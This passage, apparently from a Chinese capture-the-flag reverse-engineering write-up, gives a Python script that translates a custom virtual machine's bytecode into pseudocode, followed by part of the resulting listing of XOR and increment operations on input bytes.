<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">inst = [<span class="number">65</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">191</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">1</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">50</span>, <span class="number">192</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">50</span>, <span class="number">193</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">194</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">50</span>, <span class="number">195</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">6</span>, <span class="number">50</span>, <span class="number">197</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">198</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">8</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">8</span>, <span class="number">50</span>, <span class="number">199</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">9</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">9</span>, <span class="number">50</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">10</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">201</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">11</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">50</span>, <span class="number">202</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">203</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">13</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">13</span>, <span class="number">50</span>, <span class="number">204</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">14</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">14</span>, <span class="number">50</span>, <span class="number">205</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">15</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">206</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">207</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">208</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">209</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">19</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">50</span>, <span class="number">210</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">20</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">20</span>, <span class="number">50</span>, <span class="number">211</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">50</span>, <span class="number">212</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">22</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">213</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">23</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">23</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">24</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">215</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">25</span>, <span class="number">50</span>, <span class="number">216</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">26</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">50</span>, <span class="number">217</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">27</span>, <span class="number">50</span>, <span class="number">218</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">28</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">50</span>, <span class="number">219</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">29</span>, <span class="number">50</span>, <span class="number">220</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">30</span>, <span class="number">50</span>, <span class="number">221</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>]</span><br><span class="line">vm_ip = <span class="number">0</span></span><br><span class="line">temp_reg = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> vm_ip &lt; <span class="built_in">len</span>(inst):</span><br><span class="line"></span><br><span class="line">	opcode = inst[vm_ip]</span><br><span class="line">	operand1 = inst[vm_ip + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> opcode == <span class="number">0x11</span>:</span><br><span class="line">		code = <span class="string">f&quot;(byte) input[<span class="subst">&#123;operand1&#125;</span>]++&quot;</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x12</span>:</span><br><span class="line">		code = <span class="string">f&quot;(byte) input[<span class="subst">&#123;operand1&#125;</span>]--&quot;</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x21</span>:</span><br><span class="line">		code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span>++&quot;</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x22</span>:</span><br><span class="line">		code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span>--&quot;</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x23</span>:</span><br><span class="line">		operand2 = inst[vm_ip + <span class="number">2</span>]</span><br><span class="line">		code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span> ^= <span class="subst">&#123;operand2&#125;</span>&quot;</span></span><br><span class="line">		vm_ip += <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x24</span>:</span><br><span class="line">		operand2 = inst[vm_ip + <span class="number">2</span>]</span><br><span class="line">		code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span> ^= reg<span class="subst">&#123;operand2 - <span class="number">8</span>&#125;</span>&quot;</span></span><br><span class="line">		vm_ip += <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x25</span>:</span><br><span class="line">		code = <span class="string">f&quot;reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span> = memory[<span class="subst">&#123;temp_reg&#125;</span>]&quot;</span></span><br><span class="line">		temp_reg -= <span class="number">1</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x31</span>:</span><br><span class="line">		code = <span class="string">f&quot;input[<span class="subst">&#123;operand1&#125;</span>] = (byte) memory[<span class="subst">&#123;temp_reg&#125;</span>]&quot;</span></span><br><span class="line">		temp_reg -= <span class="number">1</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x32</span>:</span><br><span class="line">		temp_reg += <span class="number">1</span></span><br><span class="line">		code = <span class="string">f&quot;memory[<span class="subst">&#123;temp_reg&#125;</span>] = (byte) input[<span class="subst">&#123;operand1&#125;</span>]&quot;</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x41</span>:</span><br><span class="line">		temp_reg += <span class="number">1</span></span><br><span class="line">		code = <span class="string">f&quot;memory[<span class="subst">&#123;temp_reg&#125;</span>] = <span class="subst">&#123;operand1&#125;</span>&quot;</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> opcode == <span class="number">0x42</span>:</span><br><span class="line">		temp_reg += <span class="number">1</span></span><br><span class="line">		code = <span class="string">f&quot;memory[<span class="subst">&#123;temp_reg&#125;</span>] = reg<span class="subst">&#123;operand1 - <span class="number">8</span>&#125;</span>&quot;</span></span><br><span class="line">		vm_ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure>

<p>跑出来的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line">memory[<span class="number">1</span>] = <span class="number">30</span></span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">0</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">0</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">191</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">1</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">1</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">192</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">2</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">2</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">193</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">3</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">3</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">194</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">4</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">4</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">195</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">5</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">5</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">196</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">6</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">6</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">197</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">7</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">7</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">198</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">8</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">8</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">199</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">9</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">9</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">200</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">10</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">10</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">201</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">11</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2++</span><br><span class="line">memory[<span class="number">1</span>] = reg2</span><br><span class="line">input[<span class="number">11</span>] = (byte) memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">202</span>]</span><br><span class="line">reg2 = memory[<span class="number">1</span>]</span><br><span class="line">memory[<span class="number">1</span>] = (byte) input[<span class="number">12</span>]</span><br><span class="line">reg3 = memory[<span class="number">1</span>]</span><br><span class="line">reg2 ^= reg3</span><br><span class="line">reg2--</span><br><span class="line">memory[<span 